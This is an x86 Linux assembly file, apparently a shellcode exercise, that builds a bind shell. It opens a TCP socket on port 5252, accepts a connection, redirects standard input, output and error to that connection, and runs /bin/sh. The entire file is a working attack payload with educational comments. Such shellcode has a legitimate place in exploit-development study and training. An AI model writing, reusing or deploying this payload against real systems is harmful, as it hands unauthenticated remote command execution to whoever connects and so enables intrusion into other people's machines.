global _start
section .text

_start:
	; create TCP socket
	; s = socket (2,1,0)

	push BYTE 0x66		; socketcall #102 (0x66)
	pop eax			; pop 0x66 into eax
	cdq 			; zero out edx for use as a null DWORD later. Similar to xor edx, edx but saves 1 byte
	xor ebx,ebx 		; zero out ebx  which will contain the type of socketcall
	inc ebx			; SYS_SOCKET= 1 - similar to moving 1 into bl, but smaller
	push edx		; building arg array: { protocol = 0,
	push BYTE 0x1		; SOCK_STREAM = 1,
	push BYTE 0x2		; AF_INET = 2 }
	mov ecx, esp		; contains socket file descriptors
	int 0x80		; perform syscall

	mov edi, eax 		; save file descriptor for later use

	; int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	; http://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
	; bind socket to IP/Port in sockaddr struct
	; bind (sockfd, 5252, 16)

	; start with sockaddr structure and push arguments in reverse order

	xor eax, eax		; zero out eax
	push BYTE 0x66		; socketcall #102
	pop eax
	push esi 		; 0.0.0.0
	push WORD 0x8414	; 5252 in HEX is 1484, writing in in little endian for network byte
	inc ebx 		; SYS_BIND 
	push bx
	mov ecx, esp
	push byte 16		; addrLen
	push ecx
	push edi
	mov ecx, esp 		; takes the stack pointer and move it to ECX which will hold the entire bind instruction
	int 0x80		; perform syscall 

	; listen for connections using SYS_LISTEN ( int listen(int sockfd, int backlog); )

	xor eax, eax 		; zero out eax
	xor ebx, ebx		; zero out ebx
	push BYTE 0x66		; socketcall #102 (0x66)
	pop eax			; pop 0x66 into eax
	mov bl, 0x4		; #define SYS_LISTEN	4
	push esi		; backlog = 0
	push edi 		; sockfd
	mov ecx, esp 		; move stack pointer to ECX
	int 0x80		; perform syscall

	; accept connection SYS_ACCEPT (int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);)
	; When addr is null, addrlen is not used to can also be null

	
	push BYTE 0x66		; socketcall #102 (0x66) 
	pop eax			; pop 0x66 into eax
	inc ebx			; SYS_ACCEPT = 5 (EBX was left to 4 from listen call)
	push esi 		; null
	push esi 		; null
	push edi 		; sockfd
	mov ecx, esp 		; move stack pointer to ecx
	int 0x80 		; peform syscall

	; redirect descriptors stdin out and error to client socket descriptor
	; used syscall is SYS_DUP2 
	; dup2(ebx, {0,1,2})

	xchg ebx, eax 		; EAX = 0x5 EBX = new_sockfd
	xor ecx, ecx 	 	; zer out ecx
for:	
	mov al, 0x3f		; dup2
	int 0x80		; perform syscall
	inc ecx 		; interate through file descriptors (0,1,2)
	cmp cl,0x4 		; check if done
	jne for 		; repeat

	; execute /bin//sh 
	; execve("/bin//sh", null, null)
	; write them in reverse order
	
        mov al, 0xb         ; execve()  
	push edx            ; nulls for string termination
   	push 0x68732f2f     ; "hs//"  
        push 0x6e69622f     ; "nib/"  
        mov ebx, esp        ; put addres of /bin//sh into ebx  
	push edx 	    ; push 32 bit null terminator
        mov edx, esp        ; empty area for envp
	push ebx            ; push string addr to stack above null terminator
	mov ecx, esp	    ; argv array
    	int 0x80  	    ; peform syscall
	
	
